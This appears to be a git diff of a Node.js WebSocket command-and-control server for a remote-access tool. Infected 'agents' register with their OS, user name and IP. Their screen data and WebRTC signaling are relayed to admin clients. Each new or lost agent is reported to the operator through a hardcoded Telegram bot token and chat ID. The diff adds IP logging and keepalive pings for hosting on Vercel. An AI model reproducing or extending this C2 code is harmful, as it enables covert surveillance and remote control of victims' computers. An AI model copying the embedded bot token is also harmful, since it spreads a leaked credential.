@@ -13,66 +13,70 @@ const wss = new WebSocket.Server({ server });
 const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
 const TELEGRAM_CHAT_ID = '6172226452';
 
-// Store active sessions: ID -> { ws, info, isAdmin, lastSeen }
 let clients = {};
 
-// Serve admin.html from the current directory
 app.use(express.static(path.join(__dirname))); 
 
 function notifyTelegram(msg) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
-    https.get(url, (res) => {
-        // Silently ignore errors here to keep the server fast
-    }).on('error', (e) => {});
+    https.get(url, (res) => {}).on('error', (e) => {});
 }
 
-wss.on('connection', (ws) => {
-    const id = uuidv4().substr(0, 8);
+wss.on('connection', (ws, req) => {
+    // Assign ID based on IP if available, otherwise random UUID
+    let id = uuidv4().substr(0, 8);
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    
+    // Check if this is an admin connecting via browser
+    // We'll mark it as admin only when they send the 'register_admin' message
+    
+    ws.id = id;
     clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };
 
-    console.log(`[+] Client Connected: ${id}`);
+    console.log(`[+] Client Connected: ${id} | IP: ${ip}`);
 
     // Send registration confirmation back to the client
     ws.send(JSON.stringify({ type: 'registered', id: id }));
+
+    // Heartbeat to keep Vercel alive
+    let pingInterval = setInterval(() => {
+        if (ws.readyState === WebSocket.OPEN) {
+            ws.ping();
+        } else {
+            clearInterval(pingInterval);
+        }
+    }, 25000);
 
     ws.on('message', (msg) => {
         try {
             const data = JSON.parse(msg);
 
-            // Check if this is an Admin connecting
+            // Admin Registration
             if (data.type === 'register_admin') {
                 clients[id].isAdmin = true;
                 console.log(`[ADMIN] Connected with ID: ${id}`);
                 return;
             }
 
-            // If it's an agent reporting in
+            // Agent Info Packet
             if (data.type === 'info') {
                 clients[id].info = data;
                 clients[id].lastSeen = Date.now();
                 
-                // Notify all admins about the new user via UI
+                // Notify all admins
                 notifyAdmin(id, `🟢 New User: ${data.os} (${data.user})`);
-                
-                // Broadcast the info directly to admins so they appear in the grid immediately
                 broadcastToAdmin(id, data);
 
-                // Trigger Telegram Notification for the C2 owner
+                // Telegram Notification
                 notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os}\nUser: ${data.user}\nIP: ${data.ip || 'Unknown'}`);
             } 
-            // Forward signaling data (Offer/Answer/Candidate) between users
+            // Forward Signaling Data
             else if (['offer', 'answer', 'candidate'].includes(data.type)) {
                 forwardToTarget(id, data);
             } 
-            // Handle screen data or other generic broadcasts
+            // Screen Data / Generic Broadcasts
             else {
-                // Log screen updates or other events to admins
-                if (data.type === 'screen_data') {
-                    broadcastToAdmin(id, data);
-                } else {
-                    // Fallback logging for any other message types
-                    broadcastToAdmin(id, data);
-                }
+                broadcastToAdmin(id, data);
             }
         } catch (e) {
             console.error("Message parsing error:", e);
@@ -83,11 +87,15 @@ wss.on('connection', (ws) => {
         delete clients[id];
         notifyAdmin(id, '🔴 User Disconnected');
         notifyTelegram(`🔴 AGENT DISCONNECTED\nID: ${id}`);
+        console.log(`[-] Client Disconnected: ${id}`);
+    });
+
+    ws.on('pong', () => {
+        // Keepalive received
     });
 });
 
 function notifyAdmin(id, msg) {
-    // Broadcast to all admins
     wss.clients.forEach(client => {
         if (client.readyState === WebSocket.OPEN && client.isAdmin) {
             client.send(JSON.stringify({ targetId: id, type: 'alert', message: msg }));
@@ -104,7 +112,6 @@ function broadcastToAdmin(id, data) {
 }
 
 function forwardToTarget(sourceId, data) {
-    // If the data contains a specific target ID, send it there
     if (data.targetId && clients[data.targetId]) {
         const targetWs = clients[data.targetId].ws;
         if (targetWs.readyState === WebSocket.OPEN) {
